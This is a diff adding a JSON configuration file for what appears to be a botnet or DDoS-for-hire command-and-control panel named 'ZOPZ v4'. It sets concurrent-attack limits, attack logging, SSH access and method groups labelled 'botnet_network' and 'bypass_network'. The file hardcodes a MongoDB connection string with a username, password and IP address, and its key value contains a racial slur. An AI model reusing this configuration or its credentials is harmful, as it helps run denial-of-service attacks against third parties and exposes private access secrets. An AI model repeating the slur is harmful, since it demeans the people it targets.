@@ -1,0 +1,56 @@
+{
+  "owner_name": "ProjectZOPZ",
+  "cnc_name": "ZOPZ v4",
+  "banner_message": "Welcome to ZOPZV4\nAuthorized users and purposes only - Violators will be prosecuted \r\n\r\nAccess to this and use of system are restricted to authorized users and\r\ndesignated purposes. Unauthorized acccess or access attempts to this system,\r\nas well as use of this system for prohibited purposes are a crime. Criminal\r\ntrespass to this system will be prosecuted.\r\n\r\nTo maintain proper system operation and detect/deter unauthorized use, system\r\nadministrators may monitor this system. All user activities may be observed,\r\nrecorded, and/or subject to automated logging.\r\n\r\n * Acceptance and Agreement *\r\nContinuing past this point constitutes attestation of your authorization to\r\naccess this system, agreement that your use of this system falls within the\r\nscope of allowed purposes, and your acceptance of and consent to monitoring,\r\nlogging, and recording of your activities.\r\n\r\n * Disagreement *\r\nIf you do not agree to all of the above, you must immediately disconnect from\r\nthis system.",
+  "spinnertype": "",
+  "key": "zopzkeyheckersnidniggermonkey",
+  "api": 
+  {
+    "enabled": true,
+    "port": 443,
+    "cert_path": "/etc/letsencrypt/live/zopz-api.com/fullchain.pem",
+    "key_path": "/etc/letsencrypt/live/zopz-api.com/privkey.pem"
+  },
+  "ssh": 
+  {
+    "enabled": true,
+    "captcha_enabled": false,
+    "port": 1337
+  },
+  "mongo_url": "mongodb://aaron:rIGhTfailEadesto@179.61.251.44:27017/?authSource=admin",
+  "mongo_db_name": "Services",
+  "mongo_db_collection": "c2",
+  "max_attacks": 25,
+  "max_concurrents": 25,
+  "attack_logs": true,
+  "attack_settings": 
+  {
+    "method_groups": 
+    [
+      {
+        "name": "main_network",
+        "max_slots": 4,
+        "cooldown": 0,
+        "custom_role_name": "main_network"
+      },
+      {
+        "name": "home_holder",
+        "max_slots": 20,
+        "cooldown": 0,
+        "custom_role_name": "home_holder"
+      },
+      {
+        "name": "bypass_network",
+        "max_slots": 1,
+        "cooldown": 0,
+        "custom_role_name": "bypass_network"
+      },
+      {
+        "name": "botnet_network",
+        "max_slots": 1,
+        "cooldown": 60,
+        "custom_role_name": "botnet_network"
+      }
+    ]
+  }
+}
